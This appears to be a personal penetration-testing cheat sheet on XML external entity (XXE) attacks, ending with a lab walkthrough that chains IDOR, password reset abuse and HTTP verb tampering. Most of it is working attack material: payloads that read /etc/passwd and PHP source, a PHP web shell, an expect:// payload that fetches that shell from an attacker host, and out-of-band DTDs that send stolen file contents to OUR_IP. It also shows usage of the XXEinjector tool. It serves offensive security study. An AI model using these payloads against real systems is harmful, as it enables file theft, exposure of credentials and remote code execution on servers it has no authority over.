# XXE

### XXE intro

#### XML

`Extensible Markup Language (XML)` is a common markup language (similar to HTML and SGML) designed for flexible transfer and storage of data and documents in various types of applications. XML is not focused on displaying data but mostly on storing documents' data and representing data structures. XML documents are formed of element trees, where each element is essentially denoted by a `tag`, and the first element is called the `root element`, while other elements are `child elements.`

XML document representing an email structure :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2022</date>
  <time>10:00 am UTC</time>
  <sender>john@test.com</sender>
  <recipients>
    <to>HR@test.com</to>
    <cc>
        <to>billing@test.com</to>
        <to>payslips@test.com</to>
    </cc>
  </recipients>
  <body>
  Hello,
      Kindly share with me the invoice for the payment made on January 1, 2022.
  Regards,
  John
  </body> 
</email>
```

#### XML DTD

XML DTD (Document Type Definition) allows the validation of an XML document against a pre defined document structure. Below is an example of DTD

```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```

We can refer to an DTD file in an XML document. Below are the 2 ways, through file name or url

We can refer to the DTD file with the SYSTEM keyword

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://test.com/email.dtd">
```

#### XML entities

We may also define custom entities (i.e. XML variables) in XML DTDs, to allow refactoring of variables and reduce repetitive data. This can be done with the use of the `ENTITY` keyword, which is followed by the entity name and its value. Once we define an entity, it can be referenced in an XML document between an ampersand `&` and a semi-colon `;` (e.g. `&company;`). Whenever an entity is referenced, it will be replaced with its value by the XML parser. Most interestingly, however, we can `reference External XML Entities` with the `SYSTEM` keyword, which is followed by the external entity's path

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```

### Local File Disclosure

#### Identifying

Capture the request of a form we are sending for example and find the XML structure. Below, the value of the email element is being displayed in the response ⇒ we know in which element to inject

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FoFV10TRcTkCHGAwyNjOn%2Fweb_attacks_xxe_response.jpg?alt=media&#x26;token=bfea0fcc-bb43-4f38-8c54-5b3500028ee6" alt=""><figcaption></figcaption></figure>

Note: In our example, the XML input in the HTTP request had no DTD being declared within the XML data itself, or being referenced externally, so we added a new DTD before defining our entity. If the DOCTYPE was already declared in the XML request, we would just add the ENTITY element to it

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

We create an XML entity and refer to it with `&company;`

If the app wasn’t vulnerable, it would display `&company;`

However, here, the value of the entity is displayed, meaning the app is vulnerable to XXE

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FmR3VC2GoQsMKAAWG6pCU%2Fweb_attacks_xxe_new_entity.jpg?alt=media&#x26;token=b0851a54-cfc9-4376-b1ce-a4f3ba12c8cf" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Note: Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the Content-Type header to application/xml, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm). If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.
{% endhint %}

#### Reading Sensitive Files

Now that we can define new internal XML entities let's see if we can define external XML entities. Doing so is fairly similar to what we did earlier, but we'll just add the `SYSTEM` keyword and define the external reference path after it

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FGCxgpEVf2UMajbDwIcPm%2Fimage.png?alt=media&#x26;token=d614541c-35a7-4bc0-ba46-42ee88e79412" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Tip: In certain Java web applications, we may also be able to specify a directory instead of a file, and we will get a directory listing instead, which can be useful for locating sensitive files.
{% endhint %}

#### Reading source code

To read source code, include a file and convert it to base64 <mark style="background-color:$danger;">(ONLY WORKS WITH PHP APPS)</mark>

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FvqSvYwM48xgX1VnUwVPy%2Fimage.png?alt=media&#x26;token=0e5a4a7d-3857-4f71-be4e-1f29f191177d" alt=""><figcaption></figcaption></figure>

#### Remote Code Execution with XXE

In addition to reading local files, we may be able to gain code execution over the remote server. The easiest method would be to look for `ssh` keys, or attempt to utilize a hash stealing trick in Windows-based web applications, by making a call to our server. If these do not work, we may still be able to execute commands on PHP-based web applications through the `PHP://expect` filter, though this requires the PHP `expect` module to be installed and enabled.

If the XXE directly prints its output 'as shown in this section', then we can execute basic commands as `expect://id`, and the page should print the command output. However, if we did not have access to the output, or needed to execute a more complicated command 'e.g. reverse shell', then the XML syntax may break and the command may not execute.

The most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app, and then we can interact with it to execute commands. To do so, we can start by writing a basic PHP web shell and starting a python web server

```shellscript
# On our machine
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80

# In burp => we replace all spaces with $IFS not to break XML syntax
# Also avoid many characters like |, > and {
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
```

### Advanced File Disclosure

#### Advanced Exfiltration with CDATA

If the application is not PHP, in order to output data that doesn’t break XML, we need to wrap the external file reference with CDATA

```shellscript
# On our machine
echo '<!ENTITY <NAME> "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000

# On burp
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FBcdjpE06IoEYku1FznAT%2Fimage.png?alt=media&#x26;token=4d367f98-c70f-494b-86d9-f8d27e825968" alt=""><figcaption></figcaption></figure>

#### Error Based XXE

Another situation we may find ourselves in is one where the web application might not write any output, so we cannot control any of the XML input entities to write its content. In such cases, we would be `blind` to the XML output and so would not be able to retrieve the file content using our usual methods.

If the web application displays runtime errors (e.g., PHP errors) and does not have proper exception handling for the XML input, then we can use this flaw to read the output of the XXE exploit. If the web application neither writes XML output nor displays any errors, we would face a completely blind situation

First try to send malformed XML to see if the app displays any error ⇒ we referenced a non existing entity and got an error

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FmttTZposFjwg4dfKKD0q%2Fimage.png?alt=media&#x26;token=64b5b50b-50be-4171-989e-adbe6364f613" alt=""><figcaption></figcaption></figure>

We see that we did indeed cause the web application to display an error, and it also revealed the web server directory, which we can use to read the source code of other files. Now, we can exploit this flaw to exfiltrate file content. To do so, we will use a similar technique to what we used earlier

```shellscript
# Host a file with the following content on our machine
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">

# On burp
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

There is no need to include any other XML data

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F2Au2joFbpcH2TB0fIS3s%2Fimage.png?alt=media&#x26;token=125f601d-d7f5-47b3-92c1-8d8f9379c463" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
This method may also be used to read the source code of files. All we have to do is change the file name in our DTD script to point to the file we want to read (e.g. `"file:///var/www/html/submitDetails.php"`). However, `this method is not as reliable as the previous method for reading source files`, as it may have length limitations, and certain special characters may still break it
{% endhint %}

### Blind Data Exfiltration

Use if we neither get XML entities output nor PHP errors

#### Out-of-band Data Exfiltration

We will make the web application send a web request to our web server with the content of the file we are reading

```shellscript
# Put in a xxe.dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">

# Create a index?php file to decode the base64 from above that we will receive
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>

# Launch the server
php -S 0.0.0.0:8000

# In burp
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FIkIfNcxq1l11nJ3wpqwk%2Fimage.png?alt=media&#x26;token=e05652c0-d2c9-4dae-84ba-61af0ab96eba" alt=""><figcaption></figcaption></figure>

#### Automated OOB Exfiltration

{% embed url="https://github.com/enjoiz/XXEinjector" %}

```shellscript
# Copy the HTTP request from burp and write to a file for the tool to use
# We should not include the full XML data, only the first line and write 
# XXEINJECT after it as a position locator for the tool
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT

# Run the tool
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=<PATH_TO_FILE_WE_WANT_TO_READ> --oob=http --phpfilter

# The tool won't output anything. Check the results from a log file
cat Logs/10.129.201.94/etc/passwd.log 
```

### Example

We have a profile page in which we can’t do anything. Next we have a settings page from which we can reset a user password. Looking at the source code, we see that a GET request is sent to /api.php/token/. Then a POST request is made to /reset.php with a body containing the uid of the user we want to reset the password, the token grabbed from the GET, and the new password. If the access control is broken, we could try to change another user’s password.

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FKwMLj2LMSn2tu4ymymo1%2Fimage.png?alt=media&#x26;token=808e556d-7a82-4725-aeee-e6b411cf2037" alt=""><figcaption></figcaption></figure>

Intercepting the request for the token with burp, we see that we are uid 74, but changing the parameter to 1 gives us the other user’s token. That means we can change anyone’s password. The only problem is that we know their uid but not their username, so even if we changed the password, we wouldn’t be able to log in.

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FjPbkM0XuIkj8onaYY3vz%2Fimage.png?alt=media&#x26;token=a4e4ca43-e298-4924-8162-8ce05f8dbef5" alt=""><figcaption></figcaption></figure>

Going back to the profile page, we get the following in the source code. We see that a GET request to /api.php/user/ can give us the username, full name and company.

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FdV87EOcHT2Sq1tFyk4rm%2Fimage.png?alt=media&#x26;token=29179b46-35cd-4f29-89cc-bf8ee1a2c908" alt=""><figcaption></figcaption></figure>

We create a bash script to get all those informations and put the results in a file.

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FTUUyzj3lYvNINc0HcE0U%2Fimage.png?alt=media&#x26;token=991e76e1-c4da-4330-be12-9dbacd57e027" alt=""><figcaption></figcaption></figure>

To find the interesting user, we grep on adm and find the user id 52. We can try to change his password

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F5aNrQwef8DPA7lFRwX5B%2Fimage.png?alt=media&#x26;token=4c38226a-2c18-480d-a611-ace7e2b4017a" alt=""><figcaption></figcaption></figure>

We get his token

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FUTKgnOmKkmXK9FjszaJ3%2Fimage.png?alt=media&#x26;token=4af600f5-f01a-4c41-93dc-214923519837" alt=""><figcaption></figcaption></figure>

We crafted a POST request to /reset.php, but we kept getting access denied, so we tried HTTP verb tampering. Using GET instead of POST let us change the password.

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FdkWubKYm54DpI2rsUxaY%2Fimage.png?alt=media&#x26;token=cabdcb31-b204-4c9d-bdc8-16f11dabd151" alt=""><figcaption></figcaption></figure>

Logging in as the admin, we can add events. Intercepting the request with burp, we can see that the data is passed with XML.

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F0kq8SDUYzFQg74Tt7WJh%2Fimage.png?alt=media&#x26;token=9d62c416-e026-444c-9707-b0b120c506b1" alt=""><figcaption></figcaption></figure>

We try to make a custom entity, reference to it, and it is reflected on the page.

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FkJz6H0u0HCghseAEFmX2%2Fimage.png?alt=media&#x26;token=8664d501-e04d-4ca2-886f-d2ec4df1d09e" alt=""><figcaption></figcaption></figure>

Next, we extract the source code of the page to get the flag

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Fe2MX6fQH8f9idnZB8N0a%2Fimage.png?alt=media&#x26;token=11f783e9-cca6-4d6d-b3e2-7f6d785d11a0" alt=""><figcaption></figcaption></figure>
